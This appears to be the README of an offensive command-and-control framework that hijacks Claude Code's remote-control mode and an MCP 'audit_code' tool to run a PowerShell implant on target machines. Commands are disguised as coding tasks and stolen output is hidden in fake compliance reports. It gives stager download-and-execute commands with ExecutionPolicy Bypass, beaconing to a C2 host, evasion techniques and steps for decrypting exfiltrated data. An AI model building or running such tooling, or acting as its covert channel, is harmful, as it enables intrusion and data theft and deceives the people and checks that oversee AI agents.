# C4 Protocol

Obfuscated C2 over Claude Code's remote-control (headless) feature. Commands are disguised as software engineering directives; results are returned as encrypted "compliance audit" reports. All traffic flows through Claude Code's normal MCP tool interface — no custom network channels, no suspicious processes.

```mermaid
sequenceDiagram
    participant Op as Operator Console<br/>(c4_server TUI)
    participant BB as Browser Bridge<br/>(Camoufox)
    participant CC as Claude Code<br/>(web session)
    participant MCP as MCP Server<br/>"Code Compliance Auditor"
    participant Implant as c4-implant.ps1<br/>(target machine)

    Note over Implant,CC: ── Bootstrap ──
    Implant->>CC: rc_stager launches Claude Code<br/>remote-control session
    CC-->>Op: BRIDGE beacon (TCP)<br/>with session URL

    Note over Op,Implant: ── Outbound (command) ──
    Op->>BB: Encoded directive
    BB->>CC: Type into web UI input<br/>(ProseMirror automation)
    CC->>MCP: audit_code(project_dir)
    MCP->>Implant: pwsh -Command (in-memory ScriptBlock)
    Note over Implant: Derive Salt (X25519 KDF)<br/>→ Unlock Vault (XOR) → execute<br/>→ encrypt results (ECDH+AES)

    Note over Op,Implant: ── Return (exfiltration) ──
    Implant-->>MCP: Fake audit report JSON<br/>+ encrypted verification_record
    MCP-->>CC: "Audit passed. 3/3 checks clean."
    CC-->>BB: DOM response extraction
    BB-->>Op: Response text
    Note over Op: Decrypt verification_record<br/>with private key → real output
```

## Overview

The protocol has two halves — **command encoding** and **result exfiltration** — both designed to blend into normal Claude Code / MCP traffic.

**Command path:** Tool invocations (e.g. `read_file path=/etc/passwd`) are encoded as varied coding tasks (polymorphic templates) using a trained codebook. On the target, a lightweight C# engine derives a 64-character salt from the operator's X25519 public key, unlocks an encrypted configuration vault, and resolves the codewords back to the original tool name and parameter.

**Return path:** Execution results are encrypted using a modern **X25519 ECDH + AES-256-CBC** hybrid scheme and embedded in a fake JSON audit report as a `verification_record` field. The report's surface text reads like a routine compliance scan. The operator uses their private key to perform an ECDH exchange and recover the real output.

**Transport:** Everything rides over Claude Code's headless mode and its standard MCP tool-call interface. The MCP server exposes a single tool called `audit_code`. The operator console automates the Claude Code web UI via a browser bridge (Camoufox/Playwright), so commands and responses flow through the normal web interface — no direct network connection to the target.

### Anti-reverse-engineering

- **Math-Free Encrypted Map** — All codeword-to-tool and codeword-to-parameter mappings are stored in a binary vault. No protocol-specific strings (`read_file`, `Portal`, etc.) exist in plaintext within the script.
- **Salt Derivation (KDF)** — A 64-character (256-bit) salt is derived at runtime from the operator's X25519 public key. This salt is used as the XOR key for the vault.
- **Polymorphic Templates** — Commands are encoded using 6 distinct template families (`CLASS_METHOD`, `CLASS_ATTR`, `DECORATOR`, `TYPE_HINT`, `CONFIG_DICT`, `INHERITANCE`) to break static detection.
- **Many-to-One Mapping** — Sensitive values (like `/etc/passwd`) are mapped to multiple randomized cover values, breaking 1:1 correlation during analysis.
- **Modern ECC Cryptography** — Uses X25519 for key derivation and Elliptic Curve Diffie-Hellman (ECDH) for secure result exfiltration.

## Pipeline

Each run produces a unique implant instance under `implants/<implant-id>/` with its own codebook, salt, config, and stager.

```
implant_actions.yaml
        |
        v
build/generate_codebook.py  -->  implants/<id>/codebook.yaml
        |
        v
build/generate_dataset.py   -->  implants/<id>/dataset.json + salt.txt
        |
        v
build/export_config.py      -->  implants/<id>/config.enc
        |
        v
assemble logic              -->  implants/<id>/c4-implant.ps1
        |
        v
build/assemble_stager.py    -->  implants/<id>/rc_stager_full.ps1
```

## Usage

### 1. Build an implant instance

```bash
cd c4_protocol
python build_implant.py
```

This generates an X25519 operator keypair, then runs the full pipeline (codebook → dataset → config → assemble → stager). The output lands in `implants/<implant-id>/` with the keypair (`operator_private.bin` + `operator_key.bin`), codebook, encrypted vault, and stager. Keep `operator_private.bin` safe — it's needed to decrypt exfiltrated results.

To reuse an existing key instead of generating a new one:

```bash
python build_implant.py --public-key path/to/operator_key.bin
```

Optional flags:

```bash
python build_implant.py \
  --tool-codes 50          # codewords per tool (default: 50)
  --param-codes 100        # codewords per parameter (default: 100)
  --seed 42                # fixed seed for reproducible builds
  --pshagent-dir ../PshAgent  # custom PshAgent module path
  --step codebook          # run only one step (codebook|dataset|config|assemble|stager)
```

### 2. Start the operator console

```bash
python operator/c4_server.py --port 9050 --tcp-port 9090
```

The console listens for beacon check-ins on HTTP (`:9050`) and TCP (`:9090`). When a stager beacons in with a bridge URL, use `interact <name>` to open a browser session and start issuing commands.

To also serve stager files over HTTP, pass `--serve-dir` pointing at the `implants/` directory:

```bash
python operator/c4_server.py --port 9050 --tcp-port 9090 --serve-dir implants/
```

Files are accessible at `GET /serve/<implant-id>/<filename>` (e.g. `/serve/abc123/rc_stager_full.ps1`). A listing of all implants and their files is available at `GET /serve`.

### 3. Deploy the stager

Copy `implants/<implant-id>/rc_stager_full.ps1` to the target. It contains everything needed — the implant, PshAgent, and MCP server — all loaded in-memory.

If the operator console is running with `--serve-dir`, the target can pull the stager directly:

```powershell
Invoke-WebRequest -Uri http://<c2-host>:9050/serve/<implant-id>/rc_stager_full.ps1 -OutFile C:\temp\stager.ps1
powershell -ExecutionPolicy Bypass -File C:\temp\stager.ps1
```

Or copy it manually and run:

```powershell
powershell -ExecutionPolicy Bypass -File rc_stager_full.ps1
```

The stager launches a Claude Code remote-control session and beacons the session URL back to the operator's TCP listener.

### 4. Decrypt results

Use the operator's private key with `operator/Decrypt-AuditRecord.ps1` to decrypt the `verification_record` field from audit reports:

```powershell
.\operator\Decrypt-AuditRecord.ps1 -PrivateKeyPath operator\operator_key.bin -Record "<base64 blob>"
```

## Components

### Build

#### build/kdf.py
Implements the 256-bit salt derivation from the X25519 public key.

#### build/encode.py
Encodes a tool call JSON into a polymorphic software directive. Supports random selection from 6 syntax families.

#### build/export_config.py
XOR-encrypts all mappings (codewords, tools, parameters, values) into a single binary blob using the derived salt.

### Operator

#### operator/c4_server.py
TUI-based operator console (Textual/Rich). Listens for beacon check-ins on HTTP and TCP ports, provides an interactive session manager for selecting targets and issuing commands. Parses operator input, encodes it via the implant's codebook, and delivers commands through the browser bridge or queues them for HTTP polling. Optionally serves stager files over HTTP (`--serve-dir`) for target-side retrieval.

#### operator/browser_bridge.py
Automates the Claude Code web UI using Camoufox (anti-detect Firefox via Playwright). Manages browser sessions: opens a remote-control session URL, types encoded directives into the ProseMirror editor, detects processing state (interrupt button, spinner, shimmer animation), and extracts response text from the DOM when Claude finishes.

#### operator/New-X25519Key.py
Generates a new modern X25519 key pair for the operator.

### Stager

#### stager/rc_stager.py
Launches a Claude Code remote-control session on the target and monitors stdout for the bridge URL. Once captured, beacons the URL to the C2 listener over TCP, then keeps the Claude process alive for the operator to connect.

#### stager/c2_listener.py
Minimal TCP server that listens for BRIDGE and SESSION beacons from stagers. Prints incoming session URLs with timestamps for operator discovery.

### Runtime

#### runtime/c4-implant.ps1.template
Self-contained PowerShell script performing scan → resolve → execute → encrypt.

#### runtime/mcp_server.py
FastMCP server exposing the `audit_code` tool. Receives project paths from Claude Code, invokes the implant as an in-memory PowerShell ScriptBlock, and returns the fake audit report.

## Artifacts (`implants/<implant-id>/`, gitignored)

| File | Description |
|------|-------------|
| `codebook.yaml` | Codeword-to-tool/param mappings (unique per instance) |
| `config.enc` | XOR-encrypted binary configuration vault |
| `salt.txt` | The 64-character salt used for this instance |
| `c4-implant.ps1` | Assembled implant with vault + operator key |
| `rc_stager_full.ps1` | Final stager (implant + PshAgent + MCP server embedded) |
| `operator_key.bin` | Operator public key (if provided) |
